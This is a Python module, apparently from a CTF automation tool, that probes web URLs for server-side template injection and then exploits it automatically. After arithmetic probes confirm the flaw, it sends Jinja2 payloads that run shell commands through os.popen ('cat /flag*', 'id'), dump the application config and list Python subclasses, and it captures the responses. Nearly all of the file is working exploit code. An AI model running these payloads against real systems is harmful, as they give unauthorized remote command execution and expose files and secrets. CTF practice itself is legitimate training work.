"""
Server-Side Template Injection (SSTI) detection and exploitation.

This unit tests web targets for SSTI vulnerabilities by injecting
template expressions into form fields and URL parameters.
Supports detection of Jinja2, Twig, Mako, and Freemarker engines.

Common in modern web CTFs.
"""

from typing import Any, Generator

import requests
import regex as re
from flagr.unit import NotApplicable
from flagr.unit import Unit as BaseUnit


SSTI_PAYLOADS = [
    # Jinja2 / Twig
    ("{{7*7}}", b"49"),
    ("{{7*'7'}}", b"7777777"),
    # Mako
    ("${7*7}", b"49"),
    # Freemarker
    ("#{7*7}", b"49"),
]

# Jinja2 RCE payloads for flag extraction
JINJA2_RCE_PAYLOADS = [
    "{{config}}",
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag* 2>/dev/null || cat /flag* 2>/dev/null || echo NO_FLAG').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
]


class Unit(BaseUnit):

    GROUPS = ["web", "ssti", "injection", "exploit"]
    PRIORITY = 40
    RECURSE_SELF = False
    NO_RECURSE = True

    def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        if not self.target.is_url:
            raise NotApplicable("not a URL target")

    def enumerate(self) -> Generator[Any, None, None]:
        for payload, expected in SSTI_PAYLOADS:
            yield (payload, expected)

    def evaluate(self, case: Any):
        """Test for SSTI by injecting template expressions."""
        payload, expected = case

        try:
            url = self.target.upstream.decode("utf-8", errors="replace")

            # Test via GET parameter
            if "?" in url:
                base_url = url.split("?")[0]
                params = url.split("?")[1]
                test_url = f"{base_url}?{params}&test={payload}"
            else:
                test_url = f"{url}?input={payload}"

            resp = requests.get(test_url, timeout=10, verify=False)

            if expected in resp.content:
                result = f"SSTI Detected!\n  URL: {test_url}\n  Payload: {payload}\n  Engine: "
                if b"7777777" in resp.content:
                    result += "Jinja2/Twig"
                else:
                    result += "Unknown (arithmetic confirmed)"

                self.manager.register_data(self, result)

                # Try RCE payloads
                for rce_payload in JINJA2_RCE_PAYLOADS:
                    try:
                        if "?" in url:
                            rce_url = f"{base_url}?{params}&test={rce_payload}"
                        else:
                            rce_url = f"{url}?input={rce_payload}"
                        rce_resp = requests.get(rce_url, timeout=10, verify=False)
                        if rce_resp.status_code == 200 and len(rce_resp.content) > 10:
                            self.manager.register_data(self, rce_resp.content)
                    except Exception:
                        pass

        except requests.RequestException:
            pass
